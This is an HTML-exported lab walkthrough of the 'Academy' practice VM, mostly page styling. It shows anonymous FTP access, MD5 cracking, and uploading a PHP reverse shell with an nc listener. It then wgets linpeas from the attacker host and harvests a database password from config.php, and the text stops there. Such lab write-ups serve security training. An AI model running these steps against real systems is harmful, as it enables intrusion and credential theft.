@@ -1,0 +1,715 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Academy Walkthrough</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="2b96ec24-2d9b-8080-ab44-c82ccdbe6880" class="page sans"><header><h1 class="page-title">Academy Walkthrough</h1><p class="page-description"></p></header><div class="page-body"><p id="2b96ec24-2d9b-8080-89e1-da0685759ee7" class="">All  5 machines are available in this google drive <br/><a href="https://drive.google.com/drive/folders/1xJy4ozXaahXvjbgTeJVWyY-eUGIKgCj1">VMs - Google Drive</a><br/></p><figure id="2b96ec24-2d9b-8052-bb2c-d5bf2581b322" class="image"><a href="image.png"><img style="width:641.984375px" src="image.png"/></a></figure><p id="2b96ec24-2d9b-804c-936e-e0f064454e71" class="">Academy login :root<br/>password: tcm <br/>command type <br/>dhcclient<br/>ip a to get the ip of machine</p><p id="2b96ec24-2d9b-8049-aaad-f1d9076ec0b5" class="">
+</p><figure id="2b96ec24-2d9b-802c-b831-c00e175a9724" class="image"><a href="image%201.png"><img style="width:626.984375px" src="image%201.png"/></a></figure><p id="2b96ec24-2d9b-808a-9544-df22e191fad8" class="">first lets do the nmap scan </p><p id="2b96ec24-2d9b-806e-9b21-db2dda7bab29" class="">nmap 10.0.2.4</p><p id="2b96ec24-2d9b-8085-9c31-ddc0eb1002b3" class="">i recieved 3 ports open, now do the deeper scan </p><p id="2b96ec24-2d9b-801c-bf05-daae3f28a99d" class="">nmap -p 21,22,80 -A 10.0.2.4<br/></p><p id="2b96ec24-2d9b-8050-90a8-e1f5550075e2" class=""><br/></p><figure id="2b96ec24-2d9b-808f-a8e3-d4c076bc055a" class="image"><a href="image%202.png"><img style="width:626.96875px" src="image%202.png"/></a></figure><p id="2b96ec24-2d9b-8034-a2b8-f1628357fcb5" class="">
+</p><p id="2b96ec24-2d9b-80e4-bc22-caf12ab49839" class="">first lets go to google and find if these services versions are vulnerable and can we find exploit of these versions</p><p id="2b96ec24-2d9b-80bd-a555-e3f96533583e" class="">so vsftpd 3.0.3 only had DOS so its no use for us, ssame for other services versions</p><p id="2b96ec24-2d9b-80b2-864a-f1b1babe2187" class="">
+</p><p id="2b96ec24-2d9b-8074-9d6d-f11c471127ce" class="">in services we can see ftp,ssh,and http and there is a note.txt file in ftp server and nmap scan says we can login as anonymous </p><figure id="2b96ec24-2d9b-8019-ba5b-de0af3c2e6c9" class="image"><a href="image%203.png"><img style="width:626.96875px" src="image%203.png"/></a></figure><p id="2b96ec24-2d9b-803f-ae44-dc753aae6728" class="">but first let,s look at http <br/><br/>its debian default page but in pentesting this should also reported<br/>because its unhygienic.</p><figure id="2b96ec24-2d9b-8091-a32a-f038af86f4cc" class="image"><a href="image%204.png"><img style="width:626.984375px" src="image%204.png"/></a></figure><p id="2b96ec24-2d9b-8070-a819-f5d3bcfe9600" class="">now let’s go to ftp, open terminal and type </p><p id="2b96ec24-2d9b-8086-99b1-ff47f7883ee3" class="">ftp 10.0.2.4 and hit enter</p><p id="2b96ec24-2d9b-801b-88d8-d560d3cfe82b" class="">put username </p><p id="2b96ec24-2d9b-80e7-9827-f1287739779d" class="">password whatever</p><p id="2b96ec24-2d9b-8060-bd86-f5817c8d9098" class="">now get the note.txt file</p><p id="2b96ec24-2d9b-8023-b1df-c62938ae9514" class="">get note.txt</p><p id="2b96ec24-2d9b-8034-bdc2-fdefac62f18c" class="">we can just read the note file (if we knew the location of this note file then we could further upload the shell and gain priviledge) but we cant do that. so exit out from ftp after getting the file.</p><p id="2b96ec24-2d9b-80f1-85ac-c835928dff34" class="">
+</p><figure id="2b96ec24-2d9b-8010-bbb9-ef36697f38cb" class="image"><a href="image%205.png"><img style="width:626.984375px" src="image%205.png"/></a></figure><p id="2b96ec24-2d9b-80cc-a568-d59faafe4e07" class="">so, it looks like the database info here with values.</p><p id="2b96ec24-2d9b-806b-b4c1-d07cc6693e7b" class="">but it says “<strong>The StudentRegno number is what you use for login.</strong>”<br/>and StudentRegno ties to first value “10201321”, then studentPhoto value is null, and then password value is “cd73502828457d15655bbd7a63fb0bc8” but it does not look like a password it looks like a hash.<br/><br/>so copy this and identify it using hash-identifier<br/></p><figure id="2b96ec24-2d9b-8050-8585-fa8c118d140e" class="image"><a href="image%206.png"><img style="width:626.984375px" src="image%206.png"/></a></figure><p id="2b96ec24-2d9b-802e-a2d3-e8e57b577578" class="">so it is identified as md5 hash</p><p id="2b96ec24-2d9b-80c0-bd1b-e0d39234ce38" class="">save this hash in txt file</p><p id="2b96ec24-2d9b-80da-86fa-f14abe58d58c" class="">so we are going to use hashcat to crack this hash<br/></p><p id="2b96ec24-2d9b-80bb-ab8d-ca83711f5477" class="">for now i am going to use my kali vm to chowcase otherwise it is recommended to use password cracking tools on your base operating system to get the result faster.</p><figure id="2b96ec24-2d9b-80eb-86e6-cd72064ded62" class="image"><a href="image%207.png"><img style="width:626.984375px" src="image%207.png"/></a></figure><p id="2b96ec24-2d9b-80d9-827f-eb3b0f27c8f7" class="">so the hash is cracked and the password is “student”.</p><p id="2b96ec24-2d9b-8065-bdf5-e44dfefa6b5f" class="">
+</p><p id="2b96ec24-2d9b-800e-92d2-ed144dbf7cbe" class="">okay now we have student id and password but now what “where are we going next”<br/>so educated guest should be directory enumeration<br/>so i am going to use fuff for directory enumeration<br/>i am doing first level directory enumeration so fuff is good but you want to go deeper<br/>lets say within academy directory then “Dirb” is a good tool for that</p><figure id="2b96ec24-2d9b-80a8-8761-e6064287d7ce" class="image"><a href="image%208.png"><img style="width:626.96875px" src="image%208.png"/></a></figure><p id="2b96ec24-2d9b-80a1-aba9-cc66591e3338" class="">so we have directories like academy, phpmyadmin and server status with different status codes.<br/><br/>by the way if you want to know which status code means then go to this link <br/>as a pentester you should know common status codes and what means by which status code.</p><p id="2b96ec24-2d9b-80a3-8e6e-fa30ec1fb37c" class=""><a href="https://en.wikipedia.org/wiki/List_of_HTTP_status_codes">https://en.wikipedia.org/wiki/List_of_HTTP_status_codes</a></p><p id="2b96ec24-2d9b-80dd-8461-c998a7ecd83a" class="">now lets go to academy directory and see what it presents</p><p id="2b96ec24-2d9b-8097-b705-d5a0fbc35ebc" class="">
+</p><figure id="2b96ec24-2d9b-8072-b656-feb12f4fe7ee" class="image"><a href="image%209.png"><img style="width:626.984375px" src="image%209.png"/></a></figure><p id="2b96ec24-2d9b-8014-8f5b-fc0fc8de97ad" class="">so its a student log in page so now we can use studentRegNo “10201321” and password which we cracked and it was “student”.</p><p id="2b96ec24-2d9b-8046-ab81-e97fb91112c1" class="">so log in using these credentials.</p><figure id="2b96ec24-2d9b-80a2-9278-ec40f4153cec" class="image"><a href="image%2010.png"><img style="width:626.984375px" src="image%2010.png"/></a></figure><p id="2b96ec24-2d9b-8080-a744-e30cc47be690" class="">so after log in go to my profile and we can see photo upload option and we know it uses php.<br/><br/>So, we can try php reverse shell on this upload function.<br/><br/>so lets go to google and look for php reverse shell.<br/><br/></p><figure id="2b96ec24-2d9b-806f-a9cd-c2b1fc756bc7" class="image"><a href="image%2011.png"><img style="width:626.96875px" src="image%2011.png"/></a></figure><p id="2b96ec24-2d9b-8048-a493-eee5166f0587" class="">open the pentestmonkey </p><figure id="2b96ec24-2d9b-80ef-af42-c775b932e900" class="image"><a href="image%2012.png"><img style="width:626.984375px" src="image%2012.png"/></a></figure><p id="2b96ec24-2d9b-80e3-a044-cfa325b6dad9" class="">open the php file and click raw and copy it<br/>now open terminal on your (attacker) machine <br/>and paste that code in a new file </p><p id="2b96ec24-2d9b-8099-8717-e4e275b23f70" class="">nano shell.php<br/>and save it as a php file<br/></p><figure id="2b96ec24-2d9b-8075-afc5-cf5a270a4587" class="image"><a href="image%2013.png"><img style="width:626.96875px" src="image%2013.png"/></a></figure><p id="2b96ec24-2d9b-804b-a3f7-c6aebecc6b6f" class="">dont forget to change the ip address here you have to put the attacker machine ip to successfuly listen or connect to reverse shell.<br/>you can use ifconfig to check your attacking machine ip <br/>mine is 10.0.2.15 so i am going to set that</p><p id="2b96ec24-2d9b-801d-a198-dd5f57a4821c" class="">now upload that shell on student photo section<br/>and setup a listener <br/>nc -nvlp 1234</p><figure id="2b96ec24-2d9b-804a-b07b-e8ea2196cd15" class="image"><a href="image%2014.png"><img style="width:626.96875px" src="image%2014.png"/></a></figure><p id="2b96ec24-2d9b-80c9-807f-fc846e920182" class="">after uploading the shell it says “Student record updated successfully”<br/>let’s go to listener and see if there is anything came up</p><figure id="2b96ec24-2d9b-802d-b369-cdb92d07084f" class="image"><a href="image%2015.png"><img style="width:626.96875px" src="image%2015.png"/></a></figure><p id="2b96ec24-2d9b-80d1-a14d-caf6c4a3739d" class="">yes our shell was executed </p><p id="2b96ec24-2d9b-804f-aa08-f0df06d32174" class="">lets check our user level</p><p id="2b96ec24-2d9b-80d1-92ce-e5f33fdfeae6" class="">whoami</p><p id="2b96ec24-2d9b-80c6-9ccc-dbb3c0e3727f" class="">we are not root, and there is not a sudo on the machine also.<br/><br/>So, next i am going to use linpeas script to look for priviledge escalation <br/><a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20251115-0322d43c">https://github.com/peass-ng/PEASS-ng/releases/tag/20251115-0322d43c</a></p><p id="2b96ec24-2d9b-805b-b174-c2f18042ee58" class="">Download the <a href="http://linpeas.sh">linpeas.sh</a> file</p><p id="2b96ec24-2d9b-8081-b195-e07e9fc0bf4c" class="">
+</p><p id="2b96ec24-2d9b-801c-8f12-e976fd38944c" class="">after downloading the file host the python server to dump the linpeas file</p><p id="2b96ec24-2d9b-8024-badf-ec787b80f108" class="">python3 -m http.server 80<br/></p><figure id="2ba6ec24-2d9b-807e-a76e-c2a9dca84ac9" class="image"><a href="image%2016.png"><img style="width:626.984375px" src="image%2016.png"/></a></figure><p id="2ba6ec24-2d9b-802f-a62a-ec585c8508b6" class="">go to our listener and dump the linpeas file</p><p id="2ba6ec24-2d9b-80c3-b3a2-c9ec88d81dd7" class="">cd/tmp </p><p id="2ba6ec24-2d9b-80e1-86a9-ed0f170927c3" class="">wget http://10.0.2.15/linpeas.sh</p><p id="2ba6ec24-2d9b-8046-b284-da5c95ed0ace" class="">and make it executable </p><p id="2ba6ec24-2d9b-805a-a6a3-f794f3b4eb3e" class="">chmod +x linpeas.sh</p><p id="2ba6ec24-2d9b-80f9-ba81-f55ad8ec8557" class="">./linpeas.sh and hit enter</p><p id="2ba6ec24-2d9b-80de-b001-c257af644b82" class="">
+</p><p id="2ba6ec24-2d9b-8002-aafb-f27be51f96a4" class="">After looking through the outout of linpeas </p><figure id="2ba6ec24-2d9b-800f-9ce0-ceffeaf3f6cb" class="image"><a href="image%2017.png"><img style="width:626.984375px" src="image%2017.png"/></a></figure><p id="2ba6ec24-2d9b-80e7-a685-c683608a8450" class="">we have a user named grimmie and probably with admin role</p><p id="2ba6ec24-2d9b-80a0-96be-d6c814a774af" class="">* * * * * /home/grimmie/backup.sh</p><p id="2ba6ec24-2d9b-80f1-b020-cf1dfb3bd5aa" class="">lets did deeper into results</p><figure id="2ba6ec24-2d9b-800b-a2c3-f1283deb58ca" class="image"><a href="image%2018.png"><img style="width:626.984375px" src="image%2018.png"/></a></figure><p id="2ba6ec24-2d9b-80cb-922a-e32cb5ea67ae" class="">yes as we said grimmie had admin level access</p><figure id="2ba6ec24-2d9b-801c-9e14-d227e31b0705" class="image"><a href="image%2019.png"><img style="width:626.96875px" src="image%2019.png"/></a></figure><p id="2ba6ec24-2d9b-80a7-897c-c3d554fe1a9a" class="">there is some password in php file so that is interesting so copy the whole file path<br/>/var/www/html/academy/includes/config.php:$mysql_password = &quot;My_V3ryS3cur3_P4ss&quot;;</p><p id="2ba6ec24-2d9b-8036-9224-e16dc34872e6" class="">
